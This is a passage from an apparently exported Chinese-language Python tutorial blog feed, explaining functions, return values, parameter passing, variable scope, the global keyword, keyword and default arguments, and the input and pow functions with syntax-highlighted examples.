        <span class="token keyword">return</span> <span class="token number">1</span>
    <span class="token keyword">elif</span> num <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span>
        previous <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 前一项</span>
        current <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 当前项</span>
        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            temp <span class="token operator">=</span> current
            current <span class="token operator">=</span> previous <span class="token operator">+</span> current  <span class="token comment"># 当前项等于前两项和</span>
            previous <span class="token operator">=</span> temp
        <span class="token keyword">return</span> current
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token comment"># num &lt; 1</span>
        <span class="token keyword">return</span> <span class="token boolean">None</span>

num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'计算第几项：'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>fibs<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>简单说下斐波那契数列，除了第一和第二个数，后面的数等于前两个数相加，这样的一组数可以叫做斐波那契数列。</p>
<p>就算不懂斐波那契数列也没关系，只需要知道当函数内的代码执行到return语句时，马上结束函数，并把return后面的值（如果有）返回给调用者，上面把返回值马上又做为参数去调用print函数输出了。</p>
<p>函数的末尾无论是否有return，都会返回到调用处，其实相当于函数的末尾有一个隐含的没有返回值的return语句（前面提到过，所谓的“没有返回值”，其实返回了一个None，None是“空”的意思，这很好理解）</p>
<p>默认情况下，参数值和参数名称是按函数中定义的顺序匹配起来的。</p>
<p>下面总结函数的定义的基本格式：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> 函数名<span class="token punctuation">(</span>参数<span class="token number">1</span><span class="token punctuation">,</span>参数<span class="token number">2</span><span class="token punctuation">,</span>参数<span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    函数体<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<hr>
<h4 id="参数可以改变吗？"><a href="#参数可以改变吗？" class="headerlink" title="参数可以改变吗？"></a>参数可以改变吗？</h4><p>看看下面的代码，有没有一点出乎意料？</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     n <span class="token operator">=</span> <span class="token string">'abc'</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token string">'feather'</span>
<span class="token operator">>></span><span class="token operator">></span> change<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> name
<span class="token string">'feather'</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，函数内的操作并没有改变函数外的变量，实际上，函数的调用类似于下面代码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token string">'feather'</span>
<span class="token operator">>></span><span class="token operator">></span> n <span class="token operator">=</span> name  <span class="token comment"># 相当于传递参数</span>
<span class="token operator">>></span><span class="token operator">></span> n <span class="token operator">=</span> <span class="token string">'abc'</span>  <span class="token comment"># 函数内部的代码</span>
<span class="token operator">>></span><span class="token operator">></span> name
<span class="token string">'feather'</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>显然，变量n和变量name是完全不同的变量，变量n的改变并不影响到变量name，就算是定义函数时，函数名后的变量名和name一样，此name也并非彼name，如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     name <span class="token operator">=</span> <span class="token string">'abc'</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token string">'feather'</span>
<span class="token operator">>></span><span class="token operator">></span> change<span class="token punctuation">(</span>name<span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> name
<span class="token string">'feather'</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>通常来说，函数名后面的变量叫做<strong>形参</strong>，而调用函数时提供的值叫做<strong>实参</strong>（或者叫做<strong>参数</strong>），形参是实参的一份拷贝。</p>
<p>既然形参是实参的一份拷贝，那么形参的改变不影响实参咯</p>
<p>这么理解的同学要注意下面这段代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lst <span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">100</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> change<span class="token punctuation">(</span>lst<span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> lst
<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>嗯？不是说“形参是实参的一份拷贝”吗？</p>
<p>其实，上面传入了一个列表类型的参数，形参a拷贝的是实参lst这个变量本身，<code>a[0]=100</code>是通过变量a改变列表里的元素，而不是改变a这个形参本身，而像<code>a=123</code>、<code>a+=1</code>这种对变量操作的才叫做改变a参数，可以对比下面的代码来理解</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> lst <span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">change</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     a <span class="token operator">=</span> <span class="token number">123</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> change<span class="token punctuation">(</span>lst<span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> lst
<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><p>变量都有一定的使用范围，这个范围称为<strong>作用域</strong>，在执行赋值语句<code>x=1</code>后，名字x就对应到数值1，变量引用值，这其实就是个不可见的字典，这个字典叫做<strong>命名空间</strong>也是我们的<strong>作用域</strong>，python内置的vars函数可以返回当前作用域的字典</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     x <span class="token operator">=</span> <span class="token number">1</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     y <span class="token operator">=</span> <span class="token number">2</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">vars</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span><span class="token string">'__name__'</span><span class="token punctuation">:</span> <span class="token string">'__main__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'__package__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'__loader__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib.BuiltinImporter'</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'__spec__'</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">'__annotations__'</span><span class="token punctuation">:</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>module <span class="token string">'builtins'</span> <span class="token punctuation">(</span>built<span class="token operator">-</span><span class="token keyword">in</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token string">'func'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>function func at <span class="token number">0x7f7e191e70d0</span><span class="token operator">></span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> func<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span><span class="token string">'x'</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'y'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">&#125;</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以看到，函数内外获得的字典不一样，也就是说函数内外的作用域不一样，最外面的作用域称为<strong>全局作用域</strong>，每个函数调用都会创建一个新的作用域。</p>
<p>看下面代码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     x<span class="token operator">=</span><span class="token number">123</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span> func<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里的func函数里面为x变量赋值，但并为影响外面的x变量，不难想到，当调用func函数时，创建了一个新的命名空间，语句<code>x=123</code>只是在这个新的命名空间中起作用，所以它不影响外部的x。</p>
<p>函数内的变量（包括定义的参数）称为<strong>局部变量</strong>，最外层的变量称为<strong>全局变量</strong>，如果函数内想访问全局变量，如果只是想读取全局变量的值，一般来说是没什么问题的：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> func<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是想要在函数里存在和全局变量同名的局部变量就不能像这样访问了，全局变量会被同名的局部变量屏蔽，直接访问到的是局部变量，如果需要的话，可以使用globals函数获取全局变量，这个函数返回一个全局变量的字典，可以直接操作这个字典进行访问全局变量，比如下面代码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token number">123</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     x <span class="token operator">=</span> <span class="token number">1</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'局部变量x'</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'全局变量x'</span><span class="token punctuation">,</span> <span class="token builtin">globals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> func<span class="token punctuation">(</span><span class="token punctuation">)</span>
局部变量x <span class="token number">1</span>
全局变量x <span class="token number">123</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在函数内部将值赋给一个变量，这个变量就会自动成为局部变量，那么怎么才能在函数里给全局变量重新赋值呢？</p>
<p>这个时候可以是用关键字global声明变量为全局变量：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> x <span class="token operator">=</span> <span class="token number">1</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">global</span> x
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     x <span class="token operator">=</span> <span class="token number">2</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> func<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">>></span><span class="token operator">></span> x
<span class="token number">2</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="关键字参数和默认参数"><a href="#关键字参数和默认参数" class="headerlink" title="关键字参数和默认参数"></a>关键字参数和默认参数</h4><p>在上面，我们使用的参数都叫做 <strong>“位置参数”</strong>，函数定义时参数的位置决定了调用时参数的位置，有时候，调用函数弄乱了参数的位置可不是间好事，下面介绍的 <strong>“关键字参数”</strong>可以忽略这种位置的问题。</p>
<p>关键字参数其实是对于函数调用来说的，而不是函数的定义，怎么说呢，还是看看下面的代码吧</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>greeting<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>greeting<span class="token punctuation">,</span> name<span class="token punctuation">)</span>  <span class="token comment"># greeting是问候语,name是名字</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token operator">>></span><span class="token operator">></span> hello<span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token string">'feather'</span><span class="token punctuation">)</span>  <span class="token comment"># 参数位置一一对应</span>
hello feather
<span class="token operator">>></span><span class="token operator">></span> hello<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'feather'</span><span class="token punctuation">,</span>greeting<span class="token operator">=</span><span class="token string">'hello'</span><span class="token punctuation">)</span>  <span class="token comment"># 关键字参数</span>
hello feather
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>虽然第二种调用传递的参数的位置不同与函数定义时的位置，但仍能正常的工作，像第二种这样，使用参数名提供的参数叫做 <strong>“关键字参数”</strong>，它可以明确参数的作用，就算弄乱了参数的位置也无妨。</p>
<hr>
<p><strong>默认参数</strong>可以在函数的定义时给参数提供<strong>默认值</strong>：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>greeting<span class="token operator">=</span><span class="token string">'hello'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'feather'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>greeting<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> hello<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 不提供参数，使用默认值</span>
hello feather
<span class="token operator">>></span><span class="token operator">></span> hello<span class="token punctuation">(</span><span class="token string">'bye'</span><span class="token punctuation">)</span>  <span class="token comment"># 提供第一个参数</span>
bye feather
<span class="token operator">>></span><span class="token operator">></span> hello<span class="token punctuation">(</span><span class="token string">'bye'</span><span class="token punctuation">,</span> <span class="token string">'Lee'</span><span class="token punctuation">)</span>  <span class="token comment"># 提供两个参数</span>
bye Lee
<span class="token operator">>></span><span class="token operator">></span> hello<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'Lee'</span><span class="token punctuation">)</span>  <span class="token comment"># 只提供name参数</span>
hello Lee
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>提示</strong>：关键字参数和默认参数其实就是分别针对函数的调用和函数的定义同类事物两种说法（至少本人这么理解 <code>(￣_,￣ )</code>），它们可以和位置参数联合使用，不过要注意的是，对于关键字参数，也就是调用的时候，位置参数应该在关键字参数的前面，不然python解释器会不知道哪个是哪个，不信你可以这样调用上面的函数：<code>hello(name=&#39;feather&#39;, hello)</code>；而对于默认参数，也就是定义的时候，和关键字参数一样，位置参数要放在默认参数的前面，同理<code>︿(￣︶￣)︿</code></p>
<p>下面给个例子自己感受<code>\(￣ˇ￣)&gt;</code>:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> greeting<span class="token operator">=</span><span class="token string">'hello'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">'bye~'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>greeting<span class="token punctuation">,</span> name<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'm fine"</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> 
<span class="token operator">>></span><span class="token operator">></span> hello<span class="token punctuation">(</span><span class="token string">'feather'</span><span class="token punctuation">)</span>
hello feather
I'm fine
bye<span class="token operator">~</span>
<span class="token operator">>></span><span class="token operator">></span> hello<span class="token punctuation">(</span><span class="token string">'feather'</span><span class="token punctuation">,</span> <span class="token string">'nice to meet you,'</span><span class="token punctuation">)</span>
nice to meet you<span class="token punctuation">,</span> feather
I'm fine
bye<span class="token operator">~</span>
<span class="token operator">>></span><span class="token operator">></span> hello<span class="token punctuation">(</span><span class="token string">'feather'</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">'bye bye!'</span><span class="token punctuation">)</span>
hello feather
I'm fine
bye bye!
<span class="token operator">>></span><span class="token operator">>></span> hello<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 这句报错，因为name没有默认值</span>
Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>
  File <span class="token string">"&lt;stdin>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>
TypeError<span class="token punctuation">:</span> hello<span class="token punctuation">(</span><span class="token punctuation">)</span> missing <span class="token number">1</span> required positional argument<span class="token punctuation">:</span> <span class="token string">'name'</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><del>提示</del> ：上面输出的是英语常用社交语句，赶紧记下！！！ <code>(❍ᴥ❍ʋ)</code></p>
<hr>
<p>不写不知道，一写吓一跳，发现函数的内容挺多的，还有部分内容要留到下一篇文章再讲了，先消化吧 。</p>
<p><code>ヾ(￣▽￣)Bye~Bye~</code></p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（三）·函数与模块</title>
    <url>/4068ff0d/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>函数，这和数学中的函数有点关联，但又不是完全等价<span id="more"></span></p>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>不说的这么官方，我就已自己的理解来表达 <code>^_^</code></p>
<p>在数学中，把一个或多个值（输入x）进行一定的计算或者映射，得到一个值（输出y），这个计算或者映射的过程就叫做函数，可以表达成：<code>y=f(x)</code>，其中f就是一个函数。</p>
<p>计算机中的函数和数学中的函数是很像的，把一定的输入（x），传递到一个函数中，进行某些操作，最后也可返回结果（y）。这里说的是“也”，意味着，在计算机中，函数是可以没有输出（y）的。</p>
<p>我们把函数的输入称为 <strong>“参数”</strong>，函数输出称为 <strong>“返回值”</strong></p>
<p>我们可以把一段重复使用的代码定义成函数，要用的时候只需要调用即可，不需要每次都写那么大段的代码，这是一种“懒惰的智慧”。</p>
<h3 id="函数的使用"><a href="#函数的使用" class="headerlink" title="函数的使用"></a>函数的使用</h3><p>在python中，有很多内置的函数，我们常用的print就是一个函数，在使用时，括号里的就是我们的参数，而这个函数是没有返回值的。</p>
<hr>
<p>对了 <code>╰(￣▽￣)╭</code>，其实在python中没有返回值的函数，都隐式地返回了一个<code>None</code>空值，这打脸真快 <code>(°ー°〃)</code></p>
<hr>
<p>在这里以print函数为例，讲解函数的使用。</p>
<p>我们可以这样调用print函数，而不用自己编写print函数内部的大量代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 传递一个字符串'hello world'作为参数给print函数</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hello world!'</span><span class="token punctuation">)</span> 

<span class="token comment"># 传递多个参数，默认以空格分开输出每个参数，其它类型的值自动转换成字符串类型</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>在调用函数的时候，只需写出函数名，并跟一对括号，括号里的填写函数所需的参数即可。</p>
<p>现在再来看另一个例子，前面曾介绍过使用幂运算符<code>**</code>来计算乘方，现在我们可以用pow函数来替代这个运算符，下面是计算2<sup>3</sup>：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">2</span><span class="token operator">**</span><span class="token number">3</span>
<span class="token number">8</span>
<span class="token operator">>></span><span class="token operator">></span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token number">8</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>显然，第一个参数是底数，第二个参数是幂，函数返回值为计算的结果8，这个pow函数就很符合数学中的函数的特征了，有输入（参数），有输出（返回值），我们还可以结合函数调用和运算符做更复杂的语句，像下面这样，不用<code>**</code>运算符计算 1 + 2<sup>10</sup>：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>
<span class="token number">1025</span>
<span class="token operator">>></span><span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h3 id="获取用户输入"><a href="#获取用户输入" class="headerlink" title="获取用户输入"></a>获取用户输入</h3><p>到目前为止，我们还没学过怎么获取用户的输入，早就该提了，可是博主认为还是应该理解函数之后再接触较好，所以只能拖到现在了，真是不好意思 </p>
<p>好了，废话不多说，现在来介绍主角：input函数，上代码！</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"下面计算a+b"</span><span class="token punctuation">)</span>

a <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入a:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
b <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"请输入b:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"a + b = "</span><span class="token punctuation">,</span> a<span class="token operator">+</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>由于需要交互，用文字不好表达，现在放上一张动图自己感受感受！<br><img src="/images/4068ff0d/input.gif" alt="input函数演示"><br>input函数接受一个字符串参数，并输出这个参数，等待用户的输入，按下回车后，输入的这一行字符串作为返回值返回出去。</p>
<p>上面的input函数调用是放在<code>int()</code>中的，意味着我们用<code>int()</code>将字符串转换成整数类型，这样才可以进行整数运算，如果我们输入的字符串不是数字，那么转换就会失败，强烈建议读者亲自尝试一下！</p>
<hr>
<p>其它有用的函数，这里直接给出例子，具体看注释：</p>
